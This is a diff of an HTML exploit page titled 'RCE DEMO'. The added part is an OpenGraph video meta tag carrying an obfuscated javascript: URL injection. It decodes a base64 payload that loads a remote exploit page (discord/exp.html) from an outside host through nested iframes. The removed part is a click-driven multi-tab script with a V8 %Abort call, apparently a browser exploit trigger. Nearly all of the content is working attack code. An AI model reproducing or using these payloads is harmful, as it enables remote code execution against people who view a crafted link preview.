@@ -1,29 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="twitter:player" content="https://player.vimeo.com/video/572419548">
+
+    <meta charset="utf-8">
+    <meta property="og:title" content="RCE DEMO">
+    <meta property="og:description" content="asdasdf<b>Description</b&lt;>">
+    <meta property="og:type" content="video">
+    <meta property="og:image" content="https://pbs.twimg.com/profile_images/1313475569426857988/Q0I0VkmF_400x400.jpg">
+    <meta property="og:image:type" content="image/jpg">
+    <meta property="og:image:width" content="1280">
+    <meta property="og:image:height" content="720">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/572419548/login/private?success=x&url=javascript://vimeo.com?f=1%27%250awindow.open(atob(location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(5).replace(location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(0,5),String.fromCharCode(0x2b)).replace(location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(0,5),String.fromCharCode(0x2b))),location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(0,5))//&payload=_selfamF2YXNjcmlwdDonPGlmcmFtZSBzcmNkb2M9IjxpZnJhbWUgc3JjPVwnaHR0cHM6Ly9jdGYuczFyMXVzLm5pbmphL2Rpc2NvcmQvZXhwLmh0bWxcJzs_selfPC9pZnJhbWU_selfIj4n">
+    <meta property="og:video:type" content="text/html">
+    <meta property="og:video:width" content="1280">
+    <meta property="og:video:height" content="720">
+</head>
 <body>
-<h1 id="prompt"></h1>
-<script>
-prompt = document.getElementById("prompt");
-
-if (location.search == "") {
-  prompt.textContent = "Click me";
-  onclick = () => {
-    w = open(location.href.replace("localhost", "127.0.0.1") + "?second_tab");
-  }
-
-  onmessage = () => {
-    location = location.href.replace("localhost", "127.0.0.1") + "?slow_request"; 
-    setTimeout(() => %Abort(0), 2500);
-  }
-} else if (location.search == "?second_tab") {
-  prompt.textContent = "Click me again";
-  onclick = () => {
-    prompt.textContent = "Please wait 10 seconds...";
-    document.documentElement.requestFullscreen();
-    opener.postMessage("", "*");
-
-    setTimeout(() => {
-      opener.location = location;
-    }, 5000);
-  }
-}
-</script>
+test
 </body>
+</html>
